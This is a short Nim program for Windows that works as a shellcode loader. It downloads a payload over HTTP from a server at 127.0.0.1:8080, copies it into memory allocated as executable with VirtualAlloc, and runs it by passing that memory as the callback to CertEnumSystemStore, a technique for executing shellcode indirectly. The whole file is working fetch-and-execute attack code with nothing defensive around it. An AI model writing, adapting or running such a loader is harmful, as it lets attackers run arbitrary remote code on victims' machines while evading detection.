#[
  nim c -d:release .\client.nim
]#
import winim
import std/[httpclient, strformat]

const url = "http://127.0.0.1:8080/"

proc callbackTrigger(payload: string) = 
  let rPtr = VirtualAlloc(
      nil, cast[SIZE_T](payload.len), MEM_COMMIT, PAGE_EXECUTE_READWRITE
    )
  copyMem(rPtr, addr payload[0], cast[SIZE_T](payload.len))
  # callback execution
  CertEnumSystemStore(
    CERT_SYSTEM_STORE_CURRENT_USER, nil, nil, 
    cast[PFN_CERT_ENUM_SYSTEM_STORE](rPtr)
  )

proc main() =
  var client = newHttpClient()
  var payload = 
    try:
      client.getContent(url)
    finally:
      client.close()
  
  echo &"[+] Received Payload (size): {payload.len}"
  echo &"[+] Trigger callback"
  callbackTrigger(payload)

when isMainModule:
  main()